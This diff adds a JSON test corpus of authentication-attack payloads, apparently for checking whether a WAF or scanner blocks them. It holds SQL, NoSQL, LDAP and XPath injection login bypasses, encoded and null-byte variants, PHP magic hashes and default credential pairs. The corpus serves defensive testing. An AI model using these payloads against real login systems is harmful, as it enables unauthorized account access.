@@ -1,0 +1,623 @@
+[
+  {
+      "id": "AUTH-LOGIN-001",
+      "payload": "' or 1=1--",
+      "tags": ["sqli", "login-bypass", "quick", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Classic SQL injection login bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-002",
+      "payload": "' or 1=1#",
+      "tags": ["sqli", "login-bypass", "mysql"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MySQL comment login bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-003",
+      "payload": "' or 1=1/*",
+      "tags": ["sqli", "login-bypass", "multiline"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Multi-line comment login bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-004",
+      "payload": "admin'--",
+      "tags": ["sqli", "login-bypass", "admin"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Admin username SQL injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-005",
+      "payload": "admin' #",
+      "tags": ["sqli", "login-bypass", "admin"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Admin with MySQL comment",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-006",
+      "payload": "admin'/*",
+      "tags": ["sqli", "login-bypass", "admin"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Admin with multiline comment",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-007",
+      "payload": "' or ''='",
+      "tags": ["sqli", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Empty string comparison bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-008",
+      "payload": "' or 'x'='x",
+      "tags": ["sqli", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "String equality bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-009",
+      "payload": "\" or \"x\"=\"x",
+      "tags": ["sqli", "login-bypass", "double-quote"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Double quote string bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-010",
+      "payload": "') or ('x'='x",
+      "tags": ["sqli", "login-bypass", "parenthesis"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parenthesis escaped bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-011",
+      "payload": "\" or 1=1--",
+      "tags": ["sqli", "login-bypass", "double-quote"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Double quote SQL bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-012",
+      "payload": "admin\" or \"1\"=\"1",
+      "tags": ["sqli", "login-bypass", "admin"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Admin double quote bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-013",
+      "payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
+      "tags": ["sqli", "union", "md5-hash"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "UNION based login bypass with MD5 hash",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-014",
+      "payload": "' UNION SELECT 1,@@version--",
+      "tags": ["sqli", "union", "version"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "UNION select version info",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-015",
+      "payload": "' UNION ALL SELECT NULL,NULL--",
+      "tags": ["sqli", "union", "null"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "UNION null column enumeration",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-016",
+      "payload": "admin') or ('1'='1",
+      "tags": ["sqli", "login-bypass", "parenthesis"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Admin with parenthesis bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-017",
+      "payload": "admin\") or (\"1\"=\"1",
+      "tags": ["sqli", "login-bypass", "double-quote"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Admin double quote parenthesis",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-018",
+      "payload": "' or a=a--",
+      "tags": ["sqli", "login-bypass", "alpha"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Alpha comparison bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-019",
+      "payload": "\" or \"a\"=\"a",
+      "tags": ["sqli", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Double quote alpha bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LOGIN-020",
+      "payload": "' or 0=0 #",
+      "tags": ["sqli", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Zero comparison bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-001",
+      "payload": "{\"$ne\": 1}",
+      "tags": ["nosql", "mongodb", "login-bypass", "quick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB not-equal bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-002",
+      "payload": "{\"$gt\": \"\"}",
+      "tags": ["nosql", "mongodb", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB greater-than bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-003",
+      "payload": "{\"$regex\": \".*\"}",
+      "tags": ["nosql", "mongodb", "regex"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB regex match-all",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-004",
+      "payload": "{\"$where\": \"1==1\"}",
+      "tags": ["nosql", "mongodb", "where"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB where clause bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-005",
+      "payload": "true, $where: '1 == 1'",
+      "tags": ["nosql", "mongodb", "where"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB where injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-006",
+      "payload": "', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'",
+      "tags": ["nosql", "mongodb", "or"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB or injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-007",
+      "payload": "' || 'a'=='a",
+      "tags": ["nosql", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "NoSQL OR bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NOSQL-008",
+      "payload": "' && this.password.match(/.*/)//+%00",
+      "tags": ["nosql", "mongodb", "regex-match"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB password regex bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LDAP-001",
+      "payload": "*)(uid=*))(|(uid=*",
+      "tags": ["ldap", "injection", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "LDAP injection login bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LDAP-002",
+      "payload": "*(|(objectclass=*))",
+      "tags": ["ldap", "injection", "wildcard"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "LDAP wildcard filter bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LDAP-003",
+      "payload": "*(|(uid=*))",
+      "tags": ["ldap", "injection"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "LDAP UID wildcard",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LDAP-004",
+      "payload": "*)(objectClass=*",
+      "tags": ["ldap", "injection", "objectclass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "LDAP objectClass injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-LDAP-005",
+      "payload": "x*)(&(|(objectclass=",
+      "tags": ["ldap", "injection", "complex"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Complex LDAP injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-XPATH-001",
+      "payload": "' or '1'='1",
+      "tags": ["xpath", "injection", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XPath injection login bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-XPATH-002",
+      "payload": "' or ''='",
+      "tags": ["xpath", "injection"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XPath empty string bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-XPATH-003",
+      "payload": "x' or name()='username' or 'x'='y",
+      "tags": ["xpath", "injection", "name-function"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XPath name function bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-XPATH-004",
+      "payload": "//*",
+      "tags": ["xpath", "injection", "wildcard"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XPath wildcard select all",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-XPATH-005",
+      "payload": "count(/child::node())",
+      "tags": ["xpath", "injection", "function"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "XPath count function injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENC-001",
+      "payload": "%27%20or%201%3D1--",
+      "tags": ["encoded", "login-bypass", "url-encoded"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "URL encoded SQL bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENC-002",
+      "payload": "%27%20or%20%271%27%3D%271",
+      "tags": ["encoded", "login-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Fully URL encoded bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENC-003",
+      "payload": "%bf' Or 1=1 -- 2",
+      "tags": ["encoded", "gbk", "multibyte"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GBK multibyte encoding bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENC-004",
+      "payload": "%bf%27 Or 1=1 -- 2",
+      "tags": ["encoded", "gbk"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GBK quote encoding bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENC-005",
+      "payload": "%c0%27 Or 1=1 -- 2",
+      "tags": ["encoded", "utf8", "overlong"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "UTF-8 overlong encoding bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENUM-001",
+      "payload": "admin",
+      "tags": ["enumeration", "username", "common"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Common admin username",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENUM-002",
+      "payload": "administrator",
+      "tags": ["enumeration", "username", "common"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Administrator username",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENUM-003",
+      "payload": "root",
+      "tags": ["enumeration", "username", "common"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Root username",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENUM-004",
+      "payload": "test",
+      "tags": ["enumeration", "username", "common"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Test username",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-ENUM-005",
+      "payload": "guest",
+      "tags": ["enumeration", "username", "common"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Guest username",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-DEFAULT-001",
+      "payload": "admin:admin",
+      "tags": ["default-creds", "admin"],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Default admin credentials",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-DEFAULT-002",
+      "payload": "admin:password",
+      "tags": ["default-creds", "admin"],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Common admin password",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-DEFAULT-003",
+      "payload": "root:root",
+      "tags": ["default-creds", "root"],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Default root credentials",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-DEFAULT-004",
+      "payload": "admin:123456",
+      "tags": ["default-creds", "weak"],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "Common weak password",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-DEFAULT-005",
+      "payload": "user:user",
+      "tags": ["default-creds", "user"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "Default user credentials",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-MAGIC-001",
+      "payload": "ffifdyop",
+      "tags": ["magic-hash", "md5", "php"],
+      "expected_block": false,
+      "severity_hint": "Critical",
+      "notes": "MD5 magic hash (0e...) bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-MAGIC-002",
+      "payload": "240610708",
+      "tags": ["magic-hash", "md5", "php"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "MD5 hash equals 0e462097431906509019562988736854",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-TYPE-001",
+      "payload": "password[]=",
+      "tags": ["type-juggling", "php", "array"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "PHP array type juggling",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-TYPE-002",
+      "payload": "password[0]=x",
+      "tags": ["type-juggling", "php", "array"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "PHP array index injection",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-TYPE-003",
+      "payload": "{\"password\": true}",
+      "tags": ["type-juggling", "json", "boolean"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "JSON boolean type juggling",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-TYPE-004",
+      "payload": "{\"password\": 0}",
+      "tags": ["type-juggling", "json", "number"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "JSON number type juggling",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NULL-001",
+      "payload": "admin\\x00",
+      "tags": ["null-byte", "truncation"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Null byte username truncation",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NULL-002",
+      "payload": "admin%00",
+      "tags": ["null-byte", "encoded"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "URL encoded null byte",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-NULL-003",
+      "payload": "admin\\0",
+      "tags": ["null-byte", "escape"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Escaped null byte",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-UNICODE-001",
+      "payload": "ąďmín",
+      "tags": ["unicode", "normalization", "admin"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "Unicode lookalike admin",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-UNICODE-002",
+      "payload": "ⒶⒹⓂⒾⓃ",
+      "tags": ["unicode", "circled", "admin"],
+      "expected_block": false,
+      "severity_hint": "High",
+      "notes": "Circled letter admin",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-CASE-001",
+      "payload": "ADMIN",
+      "tags": ["case", "uppercase"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Uppercase admin attempt",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-CASE-002",
+      "payload": "Admin",
+      "tags": ["case", "mixed"],
+      "expected_block": false,
+      "severity_hint": "Low",
+      "notes": "Mixed case admin",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-SPACE-001",
+      "payload": "admin ",
+      "tags": ["whitespace", "trailing"],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "Trailing space bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-SPACE-002",
+      "payload": " admin",
+      "tags": ["whitespace", "leading"],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "Leading space bypass",
+      "category": "Auth"
+  },
+  {
+      "id": "AUTH-SPACE-003",
+      "payload": "admin\\t",
+      "tags": ["whitespace", "tab"],
+      "expected_block": false,
+      "severity_hint": "Medium",
+      "notes": "Tab character bypass",
+      "category": "Auth"
+  }
+]
